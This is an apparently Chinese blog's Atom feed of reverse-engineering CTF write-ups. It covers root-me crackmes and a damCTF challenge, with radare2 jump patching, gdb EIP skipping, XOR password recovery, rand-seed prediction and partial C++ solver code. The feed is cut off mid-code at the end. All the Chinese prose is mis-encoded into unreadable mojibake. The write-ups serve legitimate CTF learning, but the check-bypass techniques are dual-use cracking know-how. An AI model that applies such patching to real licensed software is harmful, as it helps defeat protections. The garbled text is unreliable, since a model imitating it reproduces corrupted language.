<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>å‡ å¤„æ—©èºäº‰æš–æ ‘ï¼Œè°å®¶æ–°ç‡•å•„æ˜¥æ³¥ã€‚</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2020-10-19T02:10:41.090Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>é€†å‘_root_me_4</title>
    <link href="http://finsenty54.github.io/2020/10/19/%E9%80%86%E5%90%91_root_me_4/"/>
    <id>http://finsenty54.github.io/2020/10/19/é€†å‘_root_me_4/</id>
    <published>2020-10-19T02:09:51.000Z</published>
    <updated>2020-10-19T02:10:41.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-â€”-Random-Crackme"><a href="#ELF-â€”-Random-Crackme" class="headerlink" title="ELF â€” Random Crackme"></a>ELF â€” Random Crackme</h2><p>å°†<code>magic</code>ä¹‹å‰çš„å†…å®¹éƒ½åˆ é™¤ï¼Œå› ä¸ºä¹‹å‰çš„åƒåœ¾å†…å®¹ï¼Œä½¿å¾—ä¸èƒ½è¿è¡ŒELFæ–‡ä»¶<br><code>ELF files start with 7f 45 4c 46</code><br><a href="https://imgchr.com/i/0v8xN8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/19/0v8xN8.jpg" alt="0v8xN8.jpg" border="0"></a></p><a id="more"></a><hr><p><code>r2 -ww ./ch3.bin</code><br><code>-w</code>          open file in write mode<br><code>ww foobar</code>            write wide string â€˜f\x00o\x00o\x00b\x00a\x00r\x00â€™<br> <code>wx 9090</code>     write two intel nops</p><pre><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code></pre><p><code>Short Jump</code>ï¼ˆçŸ­è·³è½¬ï¼‰æœºå™¨ç  <code>EB</code></p><hr><p><a href="https://imgchr.com/i/0vGPjs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/19/0vGPjs.jpg" alt="0vGPjs.jpg" border="0"></a></p><p>ç”¨time,randäº§ç”Ÿéšæœºå¯†ç <br>gdb ç›´æ¥è®¾ç½®<code>eip</code> è·³è¿‡ä»£ç </p><pre><code>set $eip=xxxx</code></pre><p>å†è¿è¡Œ<code>c</code></p><hr><pre><code>binwalk crackme_wtf</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2</span><br><span class="line">aaa</span><br><span class="line">afl <span class="comment">//list function</span></span><br><span class="line">s sym.main</span><br></pre></td></tr></table></figure><h2 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h2><p>str=â€break\nâ€<br>var4=0<br>var8=0xf7<br><code>(MOVSXD r64, r/m32</code> Move doubleword to quadword with sign-extension.<br>è¿™æ˜¯64ä½ä»£ç ä¸­çš„æŒ‡ä»¤ï¼Œå®ƒå°†32ä½å¯„å­˜å™¨æˆ–åœ°å€è½¬æ¢ä¸º32ä½å€¼ï¼Œå¹¶å°†å…¶ç¬¦å·æ‰©å±•ä¸º64ä½å¯„å­˜å™¨ã€‚ ç¬¦å·æ‰©å±•é‡‡ç”¨æºçš„æœ€é«˜ä½ï¼ˆç¬¦å·ä½ï¼‰çš„å€¼ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¡«å……ç›®æ ‡çš„æ‰€æœ‰é«˜ä½ã€‚)</p><p>var4+str<br>ä½ç½®åŠ var4<br>(<code>movzx</code>æ˜¯å°†æºæ“ä½œæ•°çš„å†…å®¹æ‹·è´åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶å°†è¯¥å€¼ç”¨0æ‰©å±•è‡³16ä½æˆ–è€…32ä½ã€‚ä½†æ˜¯å®ƒåªé€‚ç”¨äºæ— ç¬¦å·æ•´æ•°ã€‚ ä»–å¤§è‡´ä¸‹é¢çš„ä¸‰ç§æ ¼å¼ã€‚)</p><p>str[0]<br><code>MOVSX</code> æŒ‡ä»¤ï¼ˆè¿›è¡Œç¬¦å·æ‰©å±•å¹¶ä¼ é€ï¼‰å°†æºæ“ä½œæ•°å†…å®¹å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶æŠŠç›®çš„æ“ä½œæ•°ç¬¦å·æ‰©å±•åˆ° 16 ä½æˆ– 32 ä½ã€‚è¿™æ¡æŒ‡ä»¤åªç”¨äºæœ‰ç¬¦å·æ•´æ•°ï¼Œ</p><p><code>xor (str[0] ,0xa3)=0xf7</code></p><p><code>str[1]</code></p><p><code>cmp eax, 0xf7</code></p><p>æ³¨ï¼šä¸Šç¯‡æœ‰è‡ªåŠ¨åŒ–ä»£ç é“¾æ¥</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ELF-â€”-Random-Crackme&quot;&gt;&lt;a href=&quot;#ELF-â€”-Random-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ELF â€” Random Crackme&quot;&gt;&lt;/a&gt;ELF â€” Random Crackme&lt;/h2&gt;&lt;p&gt;å°†&lt;code&gt;magic&lt;/code&gt;ä¹‹å‰çš„å†…å®¹éƒ½åˆ é™¤ï¼Œå› ä¸ºä¹‹å‰çš„åƒåœ¾å†…å®¹ï¼Œä½¿å¾—ä¸èƒ½è¿è¡ŒELFæ–‡ä»¶&lt;br&gt;&lt;code&gt;ELF files start with 7f 45 4c 46&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://imgchr.com/i/0v8xN8&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/19/0v8xN8.jpg&quot; alt=&quot;0v8xN8.jpg&quot; border=&quot;0&quot;&gt;&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>root_me_PE_x86_SEHVEH_WP</title>
    <link href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/"/>
    <id>http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/</id>
    <published>2020-10-13T11:02:38.000Z</published>
    <updated>2020-10-13T11:03:41.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>ä½¿ç”¨ <code>NET relector</code>å·¥å…·<br>æˆ–è€…<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases" target="_blank" rel="noopener">https://github.com/0xd4d/dnSpy/releases</a><br>å°±å¯ä»¥ç ´è§£</p><a id="more"></a><hr><h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python ç¼–ç¨‹</p><p><code>åˆ«äººå†™çš„ä»£ç </code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/" target="_blank" rel="noopener">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p><p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>å°†æ•°å­—æˆ–å­—ç¬¦è½¬ä¸ºæ•´å½¢<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p><pre><code>num=line[addr+1,-1]byte.append(int (num,16)) //å°†numå˜ä¸º16è¿›åˆ¶</code></pre><p>ä½¿ç”¨<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> è·å¾—åæ±‡ç¼–ä»£ç <br>ä¹‹åè¿›è¡Œæœç´¢</p><hr><h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>ä»é¢˜ç›®çŸ¥é“æ˜¯å…³äºSEH å’Œ VEHï¼ˆVectoredExceptionHandlerï¼‰çš„ã€‚</p><p><em>OllyDBG æŸ¥çœ‹sehé“¾ é€‰æ‹© <code>view-seh chain</code></em></p><hr><ol><li><p>åœ¨è¾“å…¥åè¿›å…¥ä¸»è¦éƒ¨åˆ†ã€‚<br><img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0"><br>è¿™æ®µä¸æ˜¯å¾ˆæ‡‚ï¼Œæ ¹æ®å¤šæ¬¡è°ƒè¯•ååˆ¤æ–­ï¼Œå¦‚æœè¾“å…¥12ä¸ªå­—èŠ‚ï¼Œåˆ™<code>0xB814A8</code>å¤„å°±å¯ä»¥è·³è½¬ï¼Œä½¿<code>EBP</code>ä¸º0.<br><img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0"><br>ä¸º0ï¼Œå³è¡¨ç¤ºå¯†ç æ­£ç¡®ï¼Œä¼šè¾“å…¥æˆåŠŸè¯­å¥ã€‚</p></li><li><p>æ¥ä¸‹æ¥æ˜¯ç¬¬ä¸€éƒ¨åˆ†å¯†ç <br><img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0"><br><code>LODS</code>å³å°†å¯†ç å¤´å››ä¸ªå­—èŠ‚æ”¾å…¥<code>EAX</code>ä¸­ï¼Œå°†<code>0x5A643059 xor 0x 3628552E</code>å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†å¯†ç ï¼Œè¿˜éœ€ååºæ’åˆ—ä¸º<code>weLl</code></p></li><li><p>FSï¼š[0] ä¸ºTEBç»“æ„ä½“ä¸­æŒ‡å‘ç¬¬ä¸€ä¸ªSEHç»“æ„ä½“åœ°å€<br><img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0"><br><img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0"><br>å³<code>0xEFFC14</code>.<br>æ¥ç€ï¼Œæ‰§è¡Œ<code>INT 1</code>æŒ‡ä»¤åï¼Œä¼šè¿›å…¥<code>0xDB1D60</code>å¤„çš„ç¬¬ä¸€ä¸ªSEHå‡½æ•°ã€‚<br><img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0"><br>SEHå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³<code>[ESP+C]</code>ä¸ºpContextçš„åœ°å€ï¼ŒpContextä¿å­˜çº¿ç¨‹åˆ‡æ¢æ—¶çš„å¯„å­˜å™¨ä¿¡æ¯ã€‚åœ¨PE 32ä½ä¸‹ï¼Œ<code>+0xB0</code>ä¸ºEAXå¯„å­˜å™¨çš„å€¼ï¼Œ<code>0xB81D64</code>å¤„å°†<code>0x48335621</code>åŠ åˆ°<code>EAX+0xB0</code>ä¸­ï¼Œä¿å­˜ç€è¾“å…¥çš„ç¬¬äºŒéƒ¨åˆ†å››å­—èŠ‚å¯†ç ã€‚<br><code>+0xB8</code>ä¸ºEIPå¯„å­˜å™¨çš„å€¼ï¼Œé€šè¿‡ä¸‹é¢çš„åˆ¤æ–­å°†EIPå€¼åŠ 2ï¼Œç»“æœä¸º<code>0xB814E4</code>ï¼Œå³<code>INT 1</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ã€‚<br><code>XOR EAX,EAX</code>å°†EAXç½®0ï¼Œè¡¨ç¤ºä»å‘ç”Ÿå¼‚å¸¸çš„ä»£ç å¤„ç»§ç»­æ‰§è¡Œã€‚<br><img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0"><br>æœ€åè®¡ç®—å¦‚ä¸‹ï¼š<br><code>FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_</code><br>ååºæ’åˆ—ä¸º<code>_d@n</code></p></li><li><p><code>0xB814FF</code>å¤„è°ƒç”¨<code>AddVectoredExceptionHandler</code>å‡½æ•°ï¼Œæ–°å¢ä¸€ä¸ªSEHå‡½æ•°ã€‚<br><img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0"><br>ä»¥ä¸‹æ‘˜è‡ª<a href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><p><code>First</code><br>The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.<br>å¦‚æœä¸ä¸º0ï¼Œåˆ™æˆä¸ºç¬¬ä¸€ä¸ªè°ƒç”¨çš„SEHå‡½æ•°ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>First=1</code>.<br><code>Handler</code><br>A pointer to the handler to be called. For more information, see VectoredHandler.<br>ä»å›¾ä¸­çœ‹å‡ºï¼Œå‡½æ•°åœ°å€ä¸º<code>0xB81940</code>ï¼Œ<br><code>Return value</code><br>If the function succeeds, the return value is a handle to the exception handler.<br>If the function fails, the return value is NULL.<br><img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0"><br>è¯¥å‡½æ•°å°†ç¬¬ä¸‰éƒ¨åˆ†çš„å››å­—èŠ‚å¯†ç å‡å»äº†ä¸€ä¸ªæ•°ï¼Œä¹‹åï¼Œåˆæ‰§è¡Œç¬¬äºŒä¸ªSEHå‡½æ•°ã€‚<code>æœ‰ä¸ªç–‘é—®æ˜¯è¿™é‡Œå°†è¿”å›å€¼ç½®0ï¼Œåˆæ€ä¹ˆæ‰§è¡Œç¬¬äºŒä¸ªSEHå‡½æ•°ã€‚</code><br>æœ€åè®¡ç®—å¦‚ä¸‹ï¼š<br><code>3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E</code><br>ååºæ’åˆ—ä¸º<code>E!!!</code></p><ol><li>æœ€åä¸‰éƒ¨åˆ†å¯†ç ç»„åˆåœ¨ä¸€èµ·ï¼š<code>weLl_d@nE!!!</code><br><img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0"><br>å¯†ç æ­£ç¡®</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;PE-DotNet-0-protection&quot;&gt;&lt;a href=&quot;#PE-DotNet-0-protection&quot; class=&quot;headerlink&quot; title=&quot;PE DotNet - 0 protection&quot;&gt;&lt;/a&gt;PE DotNet - 0 protection&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨ &lt;code&gt;NET relector&lt;/code&gt;å·¥å…·&lt;br&gt;æˆ–è€…&lt;code&gt;dnSPY&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/0xd4d/dnSpy/releases&lt;/a&gt;&lt;br&gt;å°±å¯ä»¥ç ´è§£&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>damCTF- rev/schlage (beginner) __WP</title>
    <link href="http://finsenty54.github.io/2020/10/12/schlage%20(beginner)%20__WP/"/>
    <id>http://finsenty54.github.io/2020/10/12/schlage (beginner) __WP/</id>
    <published>2020-10-12T08:02:16.000Z</published>
    <updated>2020-10-12T08:08:47.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol><li><p>å…ˆç”¨<code>file</code>å‘½ä»¤æŸ¥çœ‹<br><img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0"><br>å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„ELFæ–‡ä»¶,debugä¿¡æ¯è¿˜åœ¨</p></li><li><p>æ¥ç€ä½¿ç”¨radare2åæ±‡ç¼–<br><img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0"></p></li></ol><p>ä½¿ç”¨<code>VV</code>å‘½ä»¤è¿›å…¥è§†å›¾æ¨¡å¼</p><a id="more"></a><hr><p>æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯è§£é”ï¼Œè¿™é‡Œåˆ5æŠŠé”<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0"></p><hr><p>å…³é”®çš„ä»£ç æ˜¯è¿™5ä¸ªå‡½æ•°<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0"></p><hr><h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>ç¬¬ä¸‰æŠŠé”æ¯”è¾ƒç®€å•ï¼Œæ¥çœ‹ç¬¬ä¸€æŠŠé”<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0"></p><p>ä¹Ÿå¯ä»¥åœ¨è§†å›¾æ¨¡å¼æŒ‰<code>o</code>å†è¾“å…¥å‡½æ•°æ—è¾¹çš„å­—æ¯<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0"></p><p>è¿™æ˜¯ä¸€ä¸ªå¾ªç¯æ“ä½œï¼Œå…±äº”æ¬¡ï¼Œæ¯ä¸€æ¬¡å°†ä¸¤ä¸ªæ•°å­—å¼‚æˆ–ï¼Œæœ€åå’Œ<code>0xee</code>æ¯”è¾ƒï¼Œç›¸åŒåˆ™æˆåŠŸ<br><code>rbp+rax-0x0e</code>å³æŒ‡å‘å¼€å¤´ç§»å…¥åœ°å€çš„5ä¸ªæ•°</p><p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> ç»“æœä¸º0<code>x99</code></p><h4 id="jleï¼š"><a href="#jleï¼š" class="headerlink" title="jleï¼š"></a>jleï¼š</h4><p>JNB al, bl  ï¼›alé‡Œçš„å†…å®¹ä¸ç­‰äºblæ—¶è·³è½¬<br>JBE al, bl ï¼›alé‡Œçš„å†…å®¹å°äºæˆ–ç­‰äºblæ—¶è·³è½¬</p><p>ï¼›åŒç†ï¼ŒJGBæ˜¯å¤§äºæˆ–ç­‰äºï¼Œ<code>JLEæ˜¯å°äºæˆ–ç­‰äº</code><br>ï¼›Aï¼ˆaboveï¼‰å¤§äºï¼ŒBï¼ˆbelowï¼‰å°äºï¼ŒEï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒæ— ç¬¦å·æ•°<br>ï¼›Gï¼ˆgreatï¼‰å¤§äºï¼ŒLï¼ˆless thanï¼‰å°äºï¼Œ Eï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒå¸¦ç¬¦å·æ•°</p><hr><h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0"></p><h4 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h4><p>ç¬¬5æŠŠé”ç”¨åˆ°äº†<code>srand()</code>å’Œ<code>rand()</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p><p>æ ¹æ®ç§å­äº§ç”Ÿéšæœºæ•°<br>1) ç»™srand()æä¾›ä¸€ä¸ªç§å­ï¼Œå®ƒæ˜¯ä¸€ä¸ªunsigned intç±»å‹ï¼›<br>2) è°ƒç”¨rand()ï¼Œå®ƒä¼šæ ¹æ®æä¾›ç»™srand()çš„ç§å­å€¼è¿”å›ä¸€ä¸ªéšæœºæ•°(åœ¨0åˆ°RAND_MAXä¹‹é—´)ï¼›</p><p>ä¹Ÿå°±æ˜¯ï¼Œä¸€ä¸ªç§å­ï¼Œå®ƒæ‰€äº§ç”Ÿçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>ï¼› <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></p><p>è¾“å…¥<code>rand()</code>ç”Ÿæˆçš„éšæœºæ•°å³å¯ï¼Œå³ä¸º<code>1413036362</code></p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>leaæ˜¯â€œload effective addressâ€çš„ç¼©å†™ï¼Œç®€å•çš„è¯´ï¼ŒleaæŒ‡ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªå†…å­˜åœ°å€<code>ç›´æ¥</code>èµ‹ç»™ç›®çš„æ“ä½œæ•°ï¼Œä¾‹å¦‚ï¼šlea eax,[ebx+8]å°±æ˜¯å°†ebx+8è¿™ä¸ªå€¼ç›´æ¥èµ‹ç»™eaxï¼Œè€Œä¸æ˜¯æŠŠebx+8å¤„çš„<code>å†…å­˜åœ°å€é‡Œ</code>çš„<code>æ•°æ®</code>èµ‹ç»™eaxã€‚è€ŒmovæŒ‡ä»¤åˆ™æ°æ°ç›¸åï¼Œä¾‹å¦‚ï¼šmov eax,[ebx+8]åˆ™æ˜¯æŠŠå†…å­˜åœ°å€ä¸ºebx+8å¤„çš„æ•°æ®èµ‹ç»™eaxã€‚</p><hr><h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0"><br>æŸ¥çœ‹æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œpin2æ ¹æ®å®é™…è¾“å‡ºäº†ä¸€ä¸ªç§å­ï¼Œæ ¹æ®ç§å­è°ƒç”¨<code>rand()</code>å³å¯ã€‚</p><p>è¿™ä¸ªç§å­ä¸‹ä¸€æŠŠé”è¿˜è¦ç”¨åˆ°ï¼Œå†ä¸€æ¬¡è°ƒç”¨<code>rand()</code>ï¼Œè·å¾—çš„æ˜¯ç¬¬äºŒä¸ªéšæœºæ•°ã€‚</p><hr><h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>æˆ‘è®¤ä¸ºè¿™æ˜¯æœ€éš¾å¾—äº†ï¼Œä¸»è¦æ˜¯ç¼–ç¨‹ã€‚<br>ç›´æ¥çœ‹r2 å¤ªå¤æ‚ï¼Œæ‰€ä»¥æˆ‘ç”¨IDA PROï¼Œç„¶åF5åç¼–è¯‘ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"What's your favorite sentence?"</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>)] = <span class="number">0</span>;         <span class="comment">//æ¢è¡Œç¬¦å˜ä¸º0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen é‡åˆ°/0ç»“æŸ</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//å°†éšæœºå€¼ä¸å­—ç¬¦å¼‚æˆ–ï¼Œç»“æœç›¸åŠ è¦ä¸º291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Such a cool sentence!"</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Not a big fan of that sentence"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>æ³¨é‡Šå·²ç»å†™åœ¨ä»£ç ä¸­ï¼Œæ¥ä¸‹æ¥ï¼Œå°±æ˜¯ç¼–ç¨‹ç ´è§£å¾—åˆ°ç¬¦åˆçš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;'1'&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen("nc chals.damctf.xyz 31932","rw");</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;"connect failed"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"v3="</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span 